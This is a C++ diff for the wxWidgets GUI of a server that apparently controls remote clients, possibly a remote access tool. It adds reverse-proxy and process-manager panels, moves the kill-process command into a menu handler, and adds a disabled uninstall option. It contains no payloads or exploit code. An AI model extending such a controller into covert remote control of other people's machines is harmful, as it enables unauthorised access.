@@ -16,6 +16,7 @@
 #include "panel_usuarios.hpp"
 #include "panel_escaner.hpp"
 #include "panel_fun.hpp"
+#include "panel_reverse_proxy.hpp"
 #include "file_editor.hpp"
 
 //Definir el servidor globalmente
@@ -385,17 +386,15 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
 
     //Lista de procesos remotos
     if (iComando == EnumComandos::PM_Lista) {
-        if (this->m_isFrameVisible()) {
-            try {
-                panelProcessManager* panel_proc = (panelProcessManager*)wxWindow::FindWindowById(EnumIDS::ID_PM_Panel);// , this->n_Frame);
-                if (panel_proc) {
-                    panel_proc->listManager->AgregarData(std::string(paquete.cBuffer.data()), this->p_Cliente._strPID);
-                }
-            }
-            catch (const std::exception& e) {
-                wxMessageBox(e.what(), "Exception");
+        try {
+            panelProcessManager* panel_proc = (panelProcessManager*)wxWindow::FindWindowByName(this->p_Cliente._id + "-PM");
+            if (panel_proc) {
+                panel_proc->listManager->AgregarData(std::string(paquete.cBuffer.data()), this->p_Cliente._strPID);
             }
         }
+        catch (const std::exception& e) {
+                wxMessageBox(e.what(), "Exception");
+            }
         return;
     }
 
@@ -621,14 +620,12 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
 
     //Log Remoto
     if (iComando == EnumComandos::LOG) {
-        if (this->m_isFrameVisible()) {
-            try {
-                //this->n_Frame->m_AddRemoteLog(paquete.cBuffer.data());
-            }
-            catch (const std::exception& e) {
+        try {
+            //this->n_Frame->m_AddRemoteLog(paquete.cBuffer.data());
+        }
+        catch (const std::exception& e) {
                 wxMessageBox(e.what(), "Exception");
             }
-        }
         return;
     }
 }
@@ -746,7 +743,8 @@ std::vector<std::string> Cliente_Handler::vc_GetMods() {
 
 //Crear el frame principal para interactuar con el cliente
 void Cliente_Handler::CrearFrame(const std::string strTitle,const std::string strID) {
-    this->m_setFrameVisible(true);
+    return;
+    //this->m_setFrameVisible(true);
     //this->n_Frame = new FrameCliente(this->p_Cliente._sckCliente, strTitle, this->p_Cliente);
     //this->n_Frame->Show(true);
 }
@@ -1347,7 +1345,7 @@ void Servidor::m_BorrarCliente(std::mutex& mtx, int iIndex, bool isEnd) {
             m_CerrarConexion(this->vc_Clientes[iIndex]->p_Cliente._sckCliente);
             this->vc_Clientes[iIndex]->Stop();
             this->vc_Clientes[iIndex]->JoinThread();
-            this->vc_Clientes[iIndex]->m_setFrameVisible(false);
+            //this->vc_Clientes[iIndex]->m_setFrameVisible(false);
             delete this->vc_Clientes[iIndex];
             this->vc_Clientes[iIndex] = nullptr;
 
@@ -1581,12 +1579,11 @@ void MyListCtrl::ShowContextMenu(const wxPoint& pos, long item) {
 
         wxMenu* subMenu1 = new wxMenu;
         subMenu1->Append(EnumIDS::ID_CerrarProceso, "Matar proceso");
+        subMenu1->Append(EnumIDS::ID_ReiniciarCliente, "Reiniciar conexion")->Enable(false);
         subMenu1->Append(wxID_ANY, "Actualizar cliente")->Enable(false);
-        subMenu1->Append(EnumIDS::ID_ReiniciarCliente, "Reiniciar conexion");
-
+        subMenu1->Append(wxID_ANY, "Desinstalar cliente")->Enable(false);
+        
         menu.AppendSubMenu(subMenu1, "Cliente");
-        menu.AppendSeparator();
-        menu.Append(EnumIDS::ID_Refrescar, "Refrescar");
 
         PopupMenu(&menu, pos.x, pos.y);
     }
@@ -1671,13 +1668,6 @@ void MyListCtrl::OnRefrescar(wxCommandEvent& event) {
     }
 }
 
-void MyListCtrl::OnMatarProceso(wxCommandEvent& event) {
-    if (this->iClienteID != -1) {
-        p_Servidor->cChunkSend(p_Servidor->vc_Clientes[this->iClienteID]->p_Cliente._sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::CLI_STOP);
-        p_Servidor->m_CerrarConexion(p_Servidor->vc_Clientes[this->iClienteID]->p_Cliente._sckCliente);
-    }
-}
-
 //Eventos menu de mods habilitados
 void MyListCtrl::OnModMenu(wxCommandEvent& event) {
     const int menuID = event.GetId();
@@ -1715,13 +1705,16 @@ void MyListCtrl::OnModMenu(wxCommandEvent& event) {
     }else if (menuID == EnumMenuMods::ID_OnAdminArchivos) {
         panelFileManager* panelFM = new panelFileManager(this, tmpSocket, this->strTmp.ToStdString(), p_Servidor->vc_Clientes[this->iClienteID]->p_Cliente._strIp);
         panelFM->Show();
+    }else if (menuID == EnumMenuMods::ID_OnProxyInversa) {
+        panelReverseProxy* panelPROXY = new panelReverseProxy(this, tmpSocket, this->strTmp.ToStdString());
+        panelPROXY->Show();
+    }else if (menuID == EnumMenuMods::ID_OnAdminProcesos) {
+        panelProcessManager* panelPM = new panelProcessManager(this, tmpSocket, this->strTmp.ToStdString());
+        panelPM->Show();
     }
-}
-
-void MyListCtrl::OnProxyInversa(wxCommandEvent& event) {
-    event.Skip();
-}
-
-void MyListCtrl::OnAdminProcesos(wxCommandEvent& event) {
-    event.Skip();
+    //Comandos de cliente, cerrar, reiniciar, actualizar, desinstalar
+    else if (menuID == EnumIDS::ID_CerrarProceso) {
+        p_Servidor->cChunkSend(tmpSocket, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::CLI_STOP);
+        p_Servidor->m_CerrarConexion(tmpSocket);
+    } 
 }
